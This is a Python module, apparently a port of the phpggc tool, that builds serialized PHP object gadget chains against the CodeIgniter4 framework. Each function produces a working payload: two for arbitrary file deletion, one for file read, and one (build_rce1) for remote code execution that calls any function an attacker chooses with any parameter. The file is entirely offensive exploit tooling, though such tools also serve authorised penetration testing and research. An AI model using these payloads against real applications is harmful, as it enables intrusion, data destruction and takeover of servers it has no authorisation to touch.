"""CodeIgniter4 gadget chains — byte-identical to ambionics/phpggc."""
from __future__ import annotations

import os

from ..platform import maybe_wrap
from ..serialize import php_arr, php_empty_obj, php_int, php_null, php_obj, php_str, priv, prot


def build_fd1(remote_path: str, *, fast_destruct: bool = False) -> bytes:
    prefix = os.path.dirname(remote_path) + "/"
    lock_key = os.path.basename(remote_path)
    file_handler = php_obj("CodeIgniter\\Cache\\Handlers\\FileHandler", [
        (prot("prefix"), php_str(prefix)),
        (prot("path"), php_str("")),
    ])
    memcached = php_obj("CodeIgniter\\Session\\Handlers\\MemcachedHandler", [
        (prot("memcached"), file_handler),
        (prot("lockKey"), php_str(lock_key)),
    ])
    redis = php_obj("CodeIgniter\\Cache\\Handlers\\RedisHandler", [
        (prot("redis"), memcached),
    ])
    return maybe_wrap(redis, fast_destruct)


def build_fd2(remote_path: str, *, fast_destruct: bool = False) -> bytes:
    publisher = php_obj("CodeIgniter\\Publisher\\Publisher", [
        (priv("CodeIgniter\\Publisher\\Publisher", "scratch"), php_str(remote_path)),
    ])
    return maybe_wrap(publisher, fast_destruct)


def build_fr1(remote_path: str, *, fast_destruct: bool = False) -> bytes:
    cell = php_obj("CodeIgniter\\View\\Cells\\Cell", [
        (prot("view"), php_str(remote_path)),
    ])
    return maybe_wrap(cell, fast_destruct)


def build_rce1(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    validation = php_obj("CodeIgniter\\Validation\\Validation", [
        (prot("ruleSetFiles"), php_arr([(php_int(0), php_str("finfo"))])),
    ])
    model = php_obj("CodeIgniter\\Model", [
        (prot("builder"), php_empty_obj("CodeIgniter\\Database\\BaseBuilder")),
        (prot("primaryKey"), php_null()),
        (prot("beforeDelete"), php_arr([(php_int(0), php_str("validate"))])),
        (prot("validationRules"), php_arr([
            (php_str("id"), php_arr([
                (php_str("rules"), php_arr([(php_int(0), php_str(function))])),
            ])),
        ])),
        (prot("validation"), validation),
    ])
    memcached = php_obj("CodeIgniter\\Session\\Handlers\\MemcachedHandler", [
        (prot("memcached"), model),
        (prot("lockKey"), php_str(parameter)),
    ])
    redis = php_obj("CodeIgniter\\Cache\\Handlers\\RedisHandler", [
        (prot("redis"), memcached),
    ])
    return maybe_wrap(redis, fast_destruct)
